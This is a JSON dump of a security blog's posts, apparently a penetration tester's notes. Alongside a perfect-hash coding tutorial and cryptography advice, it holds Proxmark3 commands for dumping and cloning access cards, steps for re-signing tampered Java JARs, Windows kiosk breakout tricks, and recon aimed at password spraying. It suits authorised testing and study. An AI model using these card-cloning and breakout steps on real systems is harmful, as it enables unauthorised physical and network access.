[ { "title": "Magic Number Perfect Hash Function", "url": "/posts/magic-number-perfect-hash-function/", "categories": "programming", "tags": "programming, javascript, rust", "date": "2023-08-15 20:08:48 +1000", "snippet": "In this post we’ll look at how to use magic numbers to create a perfect hash function for a set of Key Value pairs with Integer keys that is known a ahead of time.We’ll assume that we are using 64-...", "content": "In this post we’ll look at how to use magic numbers to create a perfect hash function for a set of Key Value pairs with Integer keys that is known a ahead of time.We’ll assume that we are using 64-bit integers as the keys in our Key Value pairs. The Problem Standard Hash Table Using Magic Numbers Calculating Magic Numbers Example Searching for a Magic Number Important Note JavaScript Code Rust Multi-Threaded CodeThe ProblemOur goal is to create a perfect hash function (no collisions) for a set of data that is known ahead of time and will not change. Put another way, we will insert the data into Hash Table at the start, and only ever perform lookups after that.While standard Hash Table implementations can do this, the hash function they use needs to be general purpose. This isn’t ideal for when we care about performance.We don’t want a general purpose hash function since we know all keys ahead of time. We want to avoid using an expensive and slow general purpose hash function.Standard Hash TableLet’s say we have the following Key Value pair (6019811509317997855, 20). Using a normal Hash Table the value retrieval process would look something like this behind the scenes: Hash the key using the hash function. Use the resulting Hash as an index for an Array that contains all the values.This example skips over the many ways the internals of a Hash Table can work and ways collisions are dealt with (Linear/Quadratic Probing, Double hashing, Separate Chaining, Cuckoo hashing, etc), but that isn’t important because we’ll avoid that with Magic Numbers.Using Magic NumbersHere is how the value retrieval process would work if we used a Magic Number: Multiply the Key by the Magic Number and shift the result N bits to the right. Use this value as an index for an Array that contains all the values.The new hash function now consists entirely of a single multiplication and shift operation.However, the obvious question is what is the Magic Number and what is the value of N?The answer is that they are values such that the above procedure works for every key in our known set of data and will never produce a collision. The rest of this post will explain how to calculate these values for a known set of data.Calculating Magic NumbersBelow is a set of data with 5 Key Value pairs. Note that this can work perfectly fine for thousands of keys, although will require more memory and take longer to find better magic numbers.6019811509317997855 =&gt; 208863454925401798656 =&gt; 4013735527195181205504 =&gt; 6010620837929843658752 =&gt; 805503223162953909248 =&gt; 100 Key =&gt; ValueFirst off, let’s see how many bits we need to represent the index into our Array of values. As there are 5 keys, we’ll need 3-bits. More generally, we’ll need the smallest power of 2 that is larger than the number of keys we have. 2^2 = 4, which is less than 5. Therefore 2 bits ISN’T enough 2^3 = 8, which is greater than of equal to 5. Therefore 3 bits IS enough.ExampleWe said above that 3-bits is enough to represent all the indices into our Array of values. This means that said Array would be 2^3 = 8 elements in size.So how do we go from the Key to a unique 3-bit value? Like this: Find a magic number such that the first 3-bits are unique for every (Key * Magic Number)15567010318032385463 is an example of such a magic number. Below is the result of each Key multiplied by the Magic Number. The result is shown in binary with the overflow truncated:6019811509317997855 * 15567010318032385463 = 00001001101111011100000011011100101010001100100010000100001010018863454925401798656 * 15567010318032385463 = 110001001011100101101011000110000011100011001001100010000000000013735527195181205504 * 15567010318032385463 = 001101011111100111111101001000000100100000101101011110000000000010620837929843658752 * 15567010318032385463 = 11110000101110101011101101000101001101111000101111110000000000005503223162953909248 * 15567010318032385463 = 0101111000100000101000111101011101101110110001110001110000000000Notice the first 3-bits of each result. They are all unique. Because we only care about these 3-bits, we’ll shift the result all the way to the right (64 - 3 = 61) so we only have these 3-bits left.After right shifting by 61 we are left with the following:(6019811509317997855 * 15567010318032385463) &gt;&gt; 61 = 000 = 0(8863454925401798656 * 15567010318032385463) &gt;&gt; 61 = 110 = 6(13735527195181205504 * 15567010318032385463) &gt;&gt; 61 = 001 = 1(10620837929843658752 * 15567010318032385463) &gt;&gt; 61 = 111 = 7(5503223162953909248 * 15567010318032385463) &gt;&gt; 61 = 010 = 2The resulting values (0, 6, 1, 7, 2) are the indices we would use in the Array of values.E.g. for the above Key 10620837929843658752 it’s value would be stored at the 7th position of the value Array.If we want to perform a insert or lookup for a certain Key, this is what the pseudocode would look like:const MAGIC_NUMBER = 10620837929843658752;const BITS_USED = 3;const N = 64 - BITS_USED;const VALUE_ARRAY = new Array(2 ** BITS_USED);function InsertValue(KEY, VALUE) {\tVALUE_ARRAY[(MAGIC_NUMBER * KEY) &gt;&gt; N] = VALUE;}function GetValueFromKey(KEY) {\treturn VALUE_ARRAY[(MAGIC_NUMBER * KEY) &gt;&gt; N];}Searching for a Magic NumberThe final question is how the above magic number was found? The answer is simple. Brute Force search.We need to generate and test random numbers until we find one that doesn’t produce collisions (duplicate indices after the multiplication and shift).Important NoteFor the above example only 5 keys were used and 3-bits is the minimum amount needed. If instead we had 5000 keys, we would need a minimum of 13-bits (2^13 = 8192). Because there are so many keys, it’s very unlikely to find a magic number that gives unique 13-bit values. To get around this, it’s better to start by using many more bits than required, and once a valid magic number is found, search for another that is 1-bit less.Ideally we want to use the least bits possible since it reduces the size of the value Array we need to create. Every bit less we use means the value Array is half the size.JavaScript CodeSome notes on the below code: Because there is no 64-bit integer in JavaScript we need to perform an AND operation after we perform the multiplication of the Key and Magic Number. On line 16 a random prime number is generated for the magic number. This isn’t required, and a pseudo random number can be used.The code starts of by using 31 bits for the value Array, then progressively lowers it until a magic number using the minimum amount of bits is used, or until a certain amount of Iterations has passed.const crypto = require('crypto');const BIG_VALUES = [\t6019811509317997855n,\t8863454925401798656n,\t13735527195181205504n,\t10620837929843658752n,\t5503223162953909248n,];const MIN_NUMBER_OF_BITS = BIG_VALUES.length.toString(2).length;const MAX_NUMBER_OF_BITS = 64;const MAX_BIT_MASK = BigInt('0b' + (new Array(MAX_NUMBER_OF_BITS)).fill(1).join(''));function FindMagicNumberV1(outputNumberBitSize) {\tconst magicNum = crypto.generatePrimeSync(MAX_NUMBER_OF_BITS, {bigint: true})\tconst mappedNumbers = new Set();\tlet isValid = true;\tfor (let i = 0; i &lt; BIG_VALUES.length; ++i) {\t\tlet currentNumber = ((BIG_VALUES[i]*magicNum) &amp; MAX_BIT_MASK) &gt;&gt; (64n - BigInt(outputNumberBitSize));\t\tif (mappedNumbers.has(currentNumber)) {\t\t\tisValid = false;\t\t\tbreak;\t\t}\t\tmappedNumbers.add(currentNumber);\t}\tif (isValid) return {\t\tmagicNumber: magicNum,\t\tbitsUsed: outputNumberBitSize,\t};\treturn { bitsUsed: Number.MAX_SAFE_INTEGER };}let bestSoFar = {bitsUsed: 32};for (let i = 0; i &lt; 100_000_000; ++i) {\tconst result = FindMagicNumberV1(bestSoFar.bitsUsed - 1);\tif (result.bitsUsed &lt; bestSoFar.bitsUsed) {\t\tbestSoFar = result;\t\tconsole.log('Best Found:', result);\t}\tif (bestSoFar.bitsUsed === MIN_NUMBER_OF_BITS) break;}The above code outputs the following:Best Found: { magicNumber: 16098184039384438879n, bitsUsed: 31 }Best Found: { magicNumber: 16325008153248595037n, bitsUsed: 30 }Best Found: { magicNumber: 14368020153527046023n, bitsUsed: 29 }Best Found: { magicNumber: 14621349544756933247n, bitsUsed: 28 }Best Found: { magicNumber: 16540598574663265171n, bitsUsed: 27 }Best Found: { magicNumber: 16228696490751924887n, bitsUsed: 26 }Best Found: { magicNumber: 15100991816352779023n, bitsUsed: 25 }Best Found: { magicNumber: 17324609008676439523n, bitsUsed: 24 }Best Found: { magicNumber: 18256656583194581291n, bitsUsed: 23 }Best Found: { magicNumber: 14520756546626378681n, bitsUsed: 22 }Best Found: { magicNumber: 16048184102540498231n, bitsUsed: 21 }Best Found: { magicNumber: 14838936919325713043n, bitsUsed: 20 }Best Found: { magicNumber: 18217564146616633613n, bitsUsed: 19 }Best Found: { magicNumber: 15466474175171765107n, bitsUsed: 18 }Best Found: { magicNumber: 17960607931469292029n, bitsUsed: 17 }Best Found: { magicNumber: 13931438973861982927n, bitsUsed: 16 }Best Found: { magicNumber: 15085174118877062041n, bitsUsed: 15 }Best Found: { magicNumber: 13841881654513396591n, bitsUsed: 14 }Best Found: { magicNumber: 16802910703276585081n, bitsUsed: 13 }Best Found: { magicNumber: 15454353913613611463n, bitsUsed: 12 }Best Found: { magicNumber: 17444997694547404823n, bitsUsed: 11 }Best Found: { magicNumber: 15415669514167943959n, bitsUsed: 10 }Best Found: { magicNumber: 14189095924298317387n, bitsUsed: 9 }Best Found: { magicNumber: 16644222002049844057n, bitsUsed: 8 }Best Found: { magicNumber: 17759411055761750099n, bitsUsed: 7 }Best Found: { magicNumber: 17934313906907920303n, bitsUsed: 6 }Best Found: { magicNumber: 18241549279352968841n, bitsUsed: 5 }Best Found: { magicNumber: 17266648670371355939n, bitsUsed: 4 }Best Found: { magicNumber: 18006623335312784483n, bitsUsed: 3 }Rust CodeThe below code uses 12 Threads to find a magic number. Each thread will start at a specified number of bits, search for a magic number, and when found, lower the bit count by 1.use std::collections::BTreeSet;use rand::{Rng, rngs::ThreadRng};use std::thread;static BIG_VALUES: [u64; 5] = [\t6019811509317997855,\t8863454925401798656,\t13735527195181205504,\t10620837929843658752,\t5503223162953909248,];fn generate_magic_number(rng: &amp;mut ThreadRng, bits_to_use: u8) -&gt; u64 { let magic_number: u64 = rng.gen::&lt;u64&gt;(); let mut mapped_numbers: BTreeSet&lt;u64&gt; = BTreeSet::new(); for i in 0..BIG_VALUES.len() { let current_mapped_number = (BIG_VALUES[i] * magic_number) &gt;&gt; (64 - bits_to_use); if mapped_numbers.contains(&amp;current_mapped_number) { return 0; } mapped_numbers.insert(current_mapped_number); } return magic_number;}fn main() {\tprintln!(\"\");\tlet num_of_threads = 12;\tlet mut handles = vec![];\tfor _ in 0..num_of_threads {\t\tlet handle = thread::spawn(|| {\t\t\tlet mut rng = rand::thread_rng();\t\t\t\t\t\tlet min_bits: u8 = 3;\t\t\tlet mut bits: u8 = 3;\t\t\tlet mut result: u64;\t\t\t\t\tfor _ in 0..1_000_000_000 {\t\t\t\tresult = generate_magic_number(&amp;mut rng, bits);\t\t\t\t\t\t\tif result &gt; 0 {\t\t\t\t\tprintln!(\"Magic Number: ({}), Bits Used ({})\", result, bits);\t\t\t\t\tbits -= 1;\t\t\t\t\tif bits &lt; min_bits { break; }\t\t\t\t}\t\t\t}\t\t});\t\thandles.push(handle);\t}\tfor handle in handles {\t\thandle.join().unwrap();\t}\tprintln!(\"All Threads Completed.\");}The above code outputs the following:Magic Number: (7769583043006980941), Bits Used (3)Magic Number: (16132918982763439544), Bits Used (3)Magic Number: (16488419013824544368), Bits Used (3)Magic Number: (12623179947970322489), Bits Used (3)Magic Number: (12178518977004148095), Bits Used (3)Magic Number: (15227566936866480215), Bits Used (3)Magic Number: (3179281196491962013), Bits Used (3)Magic Number: (17380414587344683173), Bits Used (3)Magic Number: (9619816875933123805), Bits Used (3)Magic Number: (5377167397578549298), Bits Used (3)Magic Number: (2337733146222928516), Bits Used (3)Magic Number: (10068657740713211807), Bits Used (3)All Threads Completed." }, { "title": "Proxmark3 MIFARE Classic Reading and Cloning", "url": "/posts/proxmark3-mifare-classic-reading-and-cloning/", "categories": "security, rfid", "tags": "security, rfid, proxmark, mifare, cloning", "date": "2023-01-27 19:28:37 +1000", "snippet": "Dump Keys (check for default keys):Sometimes not all keys will be retrieved even if they are all default. Running the command again may be required.hf mf chkhf mf fchk Either command should workAu...", "content": "Dump Keys (check for default keys):Sometimes not all keys will be retrieved even if they are all default. Running the command again may be required.hf mf chkhf mf fchk Either command should workAuto Dump Card Keys &amp; Data:hf mf autopwnAlthough this should work, the data dump file can be corrupted. If this happens, it’s recommended to use the below command to dump the card data using the retrieved keys.Dump Card Data with Key File:This requires having the keys already. This command should work more reliably since it will correct errors and reload the block.hf mf dumpEmulate Card From Dump File:hf mf eload --1k -f DUMP_FILEhf mf sim --1k -u 11223344 A 7 byte UID can also be specified for the -u parameter. -u parameter may not be required, but it can be changed.Check Emulator Memory:hf mf eview Set Block in Emulator Memory:hf mf esetblk -b 4 -d 11223344112233441122334411223344 -b or --blk is the block number as a decimal number -d or --data is the block data in hex. It must be 16 bytes." }, { "title": "Proxmark3 Card Reading and Cloning", "url": "/posts/proxmark3-card-reading-and-cloning/", "categories": "security, rfid", "tags": "security, rfid, proxmark, hid, mifare, cloning", "date": "2023-01-26 18:37:46 +1000", "snippet": " Get Card Info - General Low Frequency (LF - 125 KHz) High Frequency (HF - 13.56 MHz) Working with Specific Cards EM4100 HID 125 KHz T5577 MIFARE Class...", "content": " Get Card Info - General Low Frequency (LF - 125 KHz) High Frequency (HF - 13.56 MHz) Working with Specific Cards EM4100 HID 125 KHz T5577 MIFARE Classic MIFARE Ultralight MIFARE DESFire HID IClass Cards Cloning EM4100 =&gt; T55x7 HID =&gt; T55xx T55xx =&gt; T55xx Other EM4100 FC, CN, &amp; Full Card Number Get Card Info - GeneralUse these commands if you want to discover what type of card you are working with.Low Frequency (LF - 125 KHz)lf searchHigh Frequency (HF - 13.56 MHz)hf searchWorking with Specific CardsIf you know the type of card you are working with you can use specific commands to interact with it and perform operations.EM4100Get Card Info:lf em 410x readExample:[usb] pm3 --&gt; lf em 410x read[+] EM 410x ID 520011F5D4Simulate Card:lf em 410x sim --id 520011F5D4HID 125 KHzGet Card Info:lf hid readSimulate Card:lf hid sim Extra details will be printed for how to select card type and IDT5577Use the general low-frequency search command to find out the type of tag the card is emulating.lf searchExample:[usb] pm3 --&gt; lf search[=] NOTE: some demods output possible binary[=] if it finds something that looks like a tag[=] False Positives ARE possible[=][=] Checking for known tags...[=][+] EM 410x ID 520011F5D4[+] EM410x ( RF/64 )[=] -------- Possible de-scramble patterns ---------[+] Unique TAG ID : 4A0088AF2B[=] HoneyWell IdentKey[+] DEZ 8 : 01177044[+] DEZ 10 : 0001177044[+] DEZ 5.5 : 00017.62932[+] DEZ 3.5A : 082.62932[+] DEZ 3.5B : 000.62932[+] DEZ 3.5C : 017.62932[+] DEZ 14/IK2 : 00352188495316[+] DEZ 15/IK3 : 000317836537643[+] DEZ 20/ZK : 04100000080810150211[=][+] Other : 62932_017_01177044[+] Pattern Paxton : 1378235348 [0x522633D4][+] Pattern 1 : 4387103 [0x42F11F][+] Pattern Sebury : 62932 17 1177044 [0xF5D4 0x11 0x11F5D4][+] VD / ID : 082 / 0001177044[=] ------------------------------------------------[+] Valid EM410x ID found![+] Chipset detection: T55xx[?] Hint: try `lf t55xx` commandsWipe a T5577 Card and Restore to Blank:lf t55xx wipeMIFARE ClassicGet Card Info:hf 14a infoSee the following post for more information regarding MIFARE Classic cards: Proxmark3 MIFARE Classic Reading &amp; CloningMIFARE UltralightGet Card Info:hf mfu infoDump Card Data to File:hf mfu dumpEmulate Card from Dump File:hf mfu eload -f DUMP_FILEhf mfu sim -t 2 --uid 11223344556677 -t 2 means type = MIFARE UltralightMIFARE DESFireGet Card Info:hf mfdes infoHID IClass CardsGet Card Info:hf iclass infoCloningEM4100 =&gt; T5577 Get EM4100 Card DetailsPlace the card to be cloned on the Proxmark.lf em 410x read Output should be something like [+] EM 410x ID 520011F5D4. If you already know the card ID Step 1 can be skipped. Write the ID to a T5577 CardPlace the T5577 card on the Proxmark.lf em 410x clone --id 520011F5D4 Verifylf em 410x readHID =&gt; T55xxStep 1: Scan Target Cardlf hid readTake Note of either the Raw value, or the Card Type, FC and CN.[+] [H10301 ] HID H10301 26-bit FC: 12 CN: 1234 parity ( ok )Step 2: Clone CardUsing a Raw value:lf hid clone -r 2006ec0c86Using a Card Type, FC, and CN:lf hid clone -w ind26 --fc 12 --cn 1234T55xx =&gt; T55xxStep 1: Dump Card Infolf t55xx dumpStep 2: Restore Card Info to New Cardlf t55xx restore -f &lt;FILE_NAME&gt;OtherEM4100 FC, CN, &amp; Full Card NumberPrinted on many EM4100 cards there will be three numbers:[Full Card Number] [FC],[CN]Example Card:0014076183 214,51479Above numbers represented in HEX: Full Card Number: D6C917 Facility Code (FC): D6 Card Number (CN): C917The full card number is concatenation of the FC and CN. To calculate the Full Card Number without converting to hex the following formula can be used (all numbers are in decimal): CN + (FN &lt;&lt; 16) or CN + (FN * 2**16)For the above card example: CN + (FN &lt;&lt; 16) 51479 + (214 &lt;&lt; 16) 51479 + (14024704) 14076183Going the other way: 14076183 CN = 14076183 &amp; 65535 or CN = 14076183 &amp; (2**16 - 1) CN = 51479 FN = 14076183 &gt;&gt; 16 FN = 214" }, { "title": "Modifying Source Code of JNLP Resources", "url": "/posts/modifying-source-code-of-jnlp-resources/", "categories": "security, web", "tags": "security, web, java, jnlp", "date": "2023-01-13 17:09:18 +1000", "snippet": "This guide can be used when the goal is to modify the source code of the resource JARs used by a Java application that is launched via a JNLP file.The below guide assumes the application uses HTTP ...", "content": "This guide can be used when the goal is to modify the source code of the resource JARs used by a Java application that is launched via a JNLP file.The below guide assumes the application uses HTTP to communicate with the server. A SOCKS proxy may also need to be configured in the proxy settings if it uses raw TCP with a proprietary protocol. Configure Java Proxy Security Advanced Running the Application Modifying Resources Serve Resources Locally Modify JAR Remove Original Code Signing Cert Sign Modified JAR Running the Modified ApplicationConfigure JavaIt should be noted this configuration is not the most secure, and should not be used as default settings. This configuration should only be used when required.Proxy Go to Java Control Panel -&gt; General -&gt; Network Settings... Select Use proxy server and enter Burp burp listener details (default 127.0.0.1:8080). Click Advanced, enter Burp details again if needed in the Http field, then select Use the same proxy for all protocols. Security Go to Java Control Panel -&gt; Security Select High for Security level for applications no on the Exception Site list. In the Exception Site List, add the target URLs for the application. \t- This includes the codebase attribute the JNLP definition, as well as href attribute of the resources. \t- Additional, add http://127.0.0.1:8888 to the site exception list. Modified resources will be served by a local web server from this address. AdvancedUpdate the settings in this tab to match the below:Debugging Select Enable tracing Select Enable loggingJava console Select Show consoleExecution Environment Security Settings Select Allow user to grant permissions to signed content Select Show sandbox warning banner Select Allow user to accept JNLP security request Select Don't prompt for client certificate selection when no certificates or only one exists Select Warn if site certificate does not match hostnameMixed code (sandboxed vs trusted) security verification Select Enable - show warning if neededPerform signed code certificate revocation checks on Select Do not check (not recommended)Perform TLS certificate revocation checks on Select Do not check (not recommended)Advanced Security Settings Unselect Enable the operating system's restricted environment (native sandbox) Select Use certificates and keys in browser keystore Select Enable blacklist revocation check Select Use SSL 2.0 compatible ClientHello format Select Use TLS 1.0 Select Use TLS 1.1 Select Use TLS 1.2 Select Use TLS 1.3Running the ApplicationVerify the application works with the updated Java settings. Download the JNLP file for the target application and run it. The JNLP file should be opened with javaws. Ensure the HTTP trafficModifying ResourcesServe Resources LocallyAny resources that are to be modified will need to be first manually downloaded so they can served locally from a controlled web server. The resources downloaded by the application should be visible in Burp as the first requests made.Start a local web server (Python is easiest): For Python 3.9 use python -m http.server 8888In the JNLP file update href attribute the desired resource jar to point to the local web server.E.g. change:&lt;jar href=\"/example.jar\" download=\"eager\" main=\"true\" /&gt;to&lt;jar href=\"http://127.0.0.1:8888/example.jar\" download=\"eager\" main=\"true\" /&gt;Modify JARDownload Recaf and use it modify the desired jar file.NOTE If you run the Recaf jar using JRE, you won’t be able to recompile your target jar. Make sure to run Recar using JDK java executable.\"C:\\Program Files\\Java\\jdk-11.0.12\\bin\\java.exe\" -jar recaf-2.21.13-J8-jar-with-dependencies.jarRemove Original Code Signing Cert Open your target jar file using a tool such as 7zip. Open the META-INF folder. Remove old code signing files (an SF and RSA file most likely). Don’t delete the MANIFEST.MF.Sign Modified JARTo sign the modified jar you will need a keys to sign it. These can be create with either the Java keytool, or with a program such as Keystore ExplorerIf using Keystore Explorer do the following: Create a new KeyStore of type JKS. Ensure the newly created KeyStore has a password. Give it name such as pentest-codesign. Right-click -&gt; Generate Key Pair -&gt; RSA 2048 bit Add Extensions -&gt; Use Standard Template -&gt; Code Signing -&gt; Ok Update the Common Name (CN) by clicking Edit name next to the Name field. Enter an alias for the key such as key1. Ensure the key has a password.Sign the target jar with the following command:jarsigner -keystore [KEY_STORE_NAME] -digestalg SHA-256 [TARGET_JAR] [KEY_NAME_IN_KEY_STORE]jarsigner -keystore pentest-codesign -digestalg SHA-256 example.jar \"key1\"The output should look like the following:Enter Passphrase for keystore:Enter key password for key1:jar signed.Warning:The signer's certificate is self-signed.The jar can verified using the below command:jarsigner -verify -verbose -certs example.jarRunning the Modified ApplicationIf errors are encountered it’s a good idea to check the Java console for more detailed information.Each time after running the modified application the following steps may need to be taken:Step 1 Java Control Panel -&gt; General -&gt; Temporary Internet Files -&gt; Settings -&gt; Delete Files Select Trace and Log Files &amp; Cached Applications and Applets Click OkStep 2 In the folder where the JNLP and is running from, delete any cache folders that have been created.Step 3 Try unticking Keep temporary files on my computer. However, this can prevent the application from opening." }, { "title": "Breaking out of Windows Environments", "url": "/posts/breaking-out-of-windows-environments/", "categories": "security, windows", "tags": "security, windows", "date": "2022-12-30 17:13:26 +1000", "snippet": "Collection of different things to try when attempting to breakout of a Windows environment such as Citrix, AWS AppStream, CyberArk PSM, etc. General Tips &amp; Ideas Dialogs Help/Abo...", "content": "Collection of different things to try when attempting to breakout of a Windows environment such as Citrix, AWS AppStream, CyberArk PSM, etc. General Tips &amp; Ideas Dialogs Help/About/Guide Hyperlinks Sticky Keys Magnifier Narrator Interrupt Startup Right Click Keyboard Shortcuts Restricted CMD Shell CMD/PowerShell Blocked Allowed Applications Checks to Perform After Breaking OutGeneral Tips &amp; IdeasDialogs Attempt to open Dialog Windows in the application such as Open, Save, New, Import, Export, etc. When Saving/Exporting, does the file auto open? Is there an Auto Open option. If the Dialog window is restricted, always right click in the Window and on Files to look for additional options.Help/About/Guide Look for Help/About/Guide pages and options in the application to try and launch a Web Browser.Hyperlinks Look for hyperlinks in the UI as they may be opened by a browser when clicked.Sticky Keys (Shift x5) Click Ease of Access link. Control Panel should now be open if it’s allowed.Magnifier (Win + +) Settings Icon Click Control whether Magnifier starts when I sign in. Control Panel should now be open if it’s allowed.Narrator (Win + Enter). A small window may open in the bottom left. If so, enlarge it. Click General. Click Control whether Narrator starts when I sign in. Control Panel should now be open if it’s allowed.Interrupt Startup Are there any process/setups that can be interrupted (e.g. using CTRL + C) during startup/loading of the session? Can Task Manager be opened while the session is loading?Right Click Right click everywhere in and on the application to find additional options. This can lead to more opportunities to try the above steps.Keyboard ShortcutsVarious key combinations to press to try and abuse the target application into opening Windows functionality. Windows Key Ctrl + Alt + End Ctrl + Alt + Del Ctrl + Alt + Ins Ctrl + Alt + Esc Win + R Win + E Alt + Tab Print functionality (Ctrl + P). (Windows + Left/Right/Up/Down) to Move the app.Restricted CMD ShellIdea 1: Open explorer from CMD (if allowed). Enter CMD in the location bar. See if new CMD prompt is restricted.Idea 2: While in a restricted shell change directory to C:\\Windows\\System32. Run cmd.exe. See if new CMD prompt is restricted.Idea 3: Same as Idea 2, but with PowerShell directory. Run powershell.exe or powershell_ise.exe.CMD/PowerShell BlockedIdea 1: If CMD is blocked, try PowerShell and vice versa.Idea 2: Create a bat file that contains cmd. Run the bat file via Windows Explorer.Allowed ApplicationsAre any of the following applications enabled and accessible?Command Prompt: C:\\Windows\\system32\\cmd.exePowerShell: C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exeInternet Explorer: C:\\Program Files\\Internet Explorer\\iexplore.exeFile Transfer Protocol (FTP): C:\\Windows\\system32\\ftp.exeRemote Desktop Connection (RDP): C:\\Windows\\system32\\mstsc.exeExplorer: Desktop Environment - C:\\Windows\\explorer.exe File Explorer - C:\\Windows\\system32\\explorer.exeServices: C:\\Windows\\system32\\services.mscNotepad: C:\\Windows\\system32\\notepad.exeControl Panel: C:\\Windows\\system32\\control.exeNarrator: C:\\Windows\\system32\\Narrator.exeMagnify: C:\\Windows\\system32\\Magnify.exeChecks to Perform After Breaking Out Has internet access been restricted? Is outbound DNS enabled? If RDP is in use, is Copy-Paste enabled? Can you copy files/payloads to the machine this way? Are there sensitive files stored on the machine (Documents, Downloads, Pictures, Videos, User Directory, Other Drives, Network Shares, etc). What privilege is the underlying session running as? Is the Operating System in use old and/or missing updates? Can the host communicate with other computers or shares in the network? Is privilege escalation possible? If privilege level allows for it, can the LSASS process be dumped?" }, { "title": "External Information Gathering", "url": "/posts/external-information-gathering/", "categories": "security, web", "tags": "web, security, external, enumeration", "date": "2022-12-20 13:57:31 +1000", "snippet": "Collection of tools, techniques, and payloads for external information gathering when performing an external security assessment. Subdomain Discovery &amp; Enumeration Find Certificates ...", "content": "Collection of tools, techniques, and payloads for external information gathering when performing an external security assessment. Subdomain Discovery &amp; Enumeration Find Certificates DNS Data Subdomain Fuzzing Outlook Web Access (OWA) SSO Services Azure AD Brute Forcing Generic Email Accounts OtherSubdomain Discovery &amp; EnumerationFind Certificates Certificate Search - crt.sh CensysDNS Data DNS Dumpster Pentest Tools - Subdomain FinderSubdomain FuzzingThis list can be used when attempting to discover subdomains of a given domain. The target domain should be concatenated on the end and then DNS resolution should be performed.Copy to ClipboardOutlook Web Access (OWA)You can find a the OWA portal for a target domain by going to the following link:https://outlook.office365.com/CLIENT_DOMAINSSO ServicesYou may be able to find additional single sign-on (SSO) services by visiting the following links:https://CLIENT_DOMAIN/adfs/ls/idpinitiatedsignon.aspxhttps://CLIENT_OWA_DOMAIN/adfs/ls/idpinitiatedsignon.aspx The endpoints for both links are the same, however, the domain is different.Azure AD Brute Forcing New Azure Active Directory password brute-forcing flaw has no fixGeneric Email AccountsThis list can be used when attempting to fuzz accounts for user enumeration, password spraying attacks, or phishing.Copy to ClipboardOther Fingerprinting Organizations with Collected Archives (FOCA) Search in a Search Engine \"CLIENT_NAME\" site:pastebin.com Search in a Search Engine \"CLIENT_DOMAIN\" site:pastebin.com" }, { "title": "General Encoder & Decoder", "url": "/posts/general-encoder-&-decoder/", "categories": "tools", "tags": "tools, security, cryptography, algorithm, cipher", "date": "2022-09-18 10:15:43 +1000", "snippet": "General encoder (and decoder) that can be used for various common encoding methods. Currently included decoding functions: Base64 HEX URL HTML ROT-N (1-25) Atbash String Reversal Multi Tap ...", "content": "General encoder (and decoder) that can be used for various common encoding methods. Currently included decoding functions: Base64 HEX URL HTML ROT-N (1-25) Atbash String Reversal Multi Tap Phone KeyboardAll processing is done client-side via JavaScript.InputResults" }, { "title": "Windows DNS & ARP", "url": "/posts/windows-dns/", "categories": "security, windows", "tags": "security, windows, dns, cmd, powershell", "date": "2022-07-17 11:27:47 +1000", "snippet": "This page contains information and commands about viewing and clearing the DNS and ARP caches on Windows computers, as well as the hosts file. Hosts File DNS Cache (CMD) View DNS Cache (...", "content": "This page contains information and commands about viewing and clearing the DNS and ARP caches on Windows computers, as well as the hosts file. Hosts File DNS Cache (CMD) View DNS Cache (CMD) Clear DNS Cache (CMD) DNS Cache (PowerShell) View DNS Cache (PowerShell) Clear DNS Cache (PowerShell) ARP Table View ARP Cache Clear ARP Cache Hosts FileWhen performing a DNS query to lookup the IP for a hostname, the hosts file is first checked to see if an entry exists. If it does, the IP in the host file is used. If not, a query is sent to the configured DNS server.The hosts file on Windows should be located here: C:\\Windows\\System32\\drivers\\etc\\hostsDNS Cache (CMD)View DNS Cache (CMD)ipconfig /displaydnsClear DNS Cache (CMD)ipconfig /flushdnsDNS Cache (PowerShell)View DNS Cache (PowerShell)Get-DnsClientCacheClear DNS Cache (PowerShell)Clear-DnsClientCacheARP TableThe below can be used in either CMD or PowerShellView ARP Cachearp -aClear ARP CacheFor a specific IP:Clear all ARP entries:arp –d" }, { "title": "Cryptographic Recommendation Summary", "url": "/posts/cryptographic-recommendation-summary/", "categories": "security, cryptography", "tags": "security, cryptography, encryption, decryption, cipher, hashes", "date": "2022-05-28 14:17:58 +1000", "snippet": "This post contains recommendation summaries for password security and cryptographic topics including password complexity &amp; storage, hash functions, symmetric &amp; asymmetric encryption, MACs, ...", "content": "This post contains recommendation summaries for password security and cryptographic topics including password complexity &amp; storage, hash functions, symmetric &amp; asymmetric encryption, MACs, and TLS server configurations.Each section contains a general summary of the common algorithms and recommendations, as well as links to the sources where these recommendations were obtained. Justification is not provided for these recommendations, as it can be found in the links provided. Password Complexity Password Storage Hash Functions Symmetric Encryption Block Ciphers Cipher Modes Key Derivation Asymmetric Encryption Digital Signatures Message Authentication Codes (MACs) TLS Configuration Tools for Checking TLS/SSL Configuration SSL/TLS Versions Cipher Suites Configuration Options Password Complexity Password length is more important than complexity. 8 characters shall be the minimum length acceptable, but ideally longer (10-12+). The minimum length should take into consideration the threat model being address and the confidentiality of the system and data being protected. Password length limit should be enforced to prevent excessive processing time, but not so small that strong lengthy passwords are discouraged. Allow at least 64 characters. No periodic password rotation. Passwords shall only be force changed if there is evidence of compromise. Don’t allow password hints. Allow pasting in the password field. This allows users to copy and paste from password managers. Password systems should check the supplied password against the following: Passwords from public breaches Dictionary words Repetitive &amp; sequential characters/numbers (e.g. abcdef, 12345, 111111) Inclusion of username, userId, business name, application nameNIST - Special Publication: Authentication and Lifecycle ManagementPassword Storage Always hash, never encrypt. Hash the password using HMAC with an approved hash algorithm (SHA-2 or SHA-3 family) with a shared value (called a pepper) as the key. This key shall not be stored in the database, but instead on disk or in a key store. This ensures that access/compromise of the database alone will not be enough to trivially recover passwords. Base64 encode the output hash to avoid null bytes being used as the input to the next step. Use a slow hash algorithm such as bcrypt, Argon2, or PBKDF2 to calculate the hash of the base64 encoded string with a different cryptographically random salt being used for each user. The work factor (slowness) should be tuned to an appropriate level for the application. The resulting hash and salt should be stored in the database.NIST - Special Publication: Authentication and Lifecycle ManagementMozilla Web Development - Let’s talk about password storageOWASP - Password Storage Cheat SheetHash FunctionsMD2, MD4, MD5 &amp; SHA-1 shall NOT be used except for where backwards compatibility is required. No new applications shall utilise these algorithms.SHA-2 is safe to use for applications that require secure hash algorithms. The four fixed length SHA-3 algorithms SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, &amp; SHA-512/256 are all approved for use.SHA-3 is safe to use for applications that require secure hash algorithms. The four fixed length SHA-3 algorithms SHA3-224, SHA3-256, SHA3-384, &amp; SHA3-512 are all approved for use.NIST - NIST Policy on Hash FunctionsNIST - Transitioning the Use of Cryptographic Algorithms and Key LengthsMicrosoft Cryptography - Hash and Signature AlgorithmsSymmetric EncryptionBlock CiphersRC2, RC4, 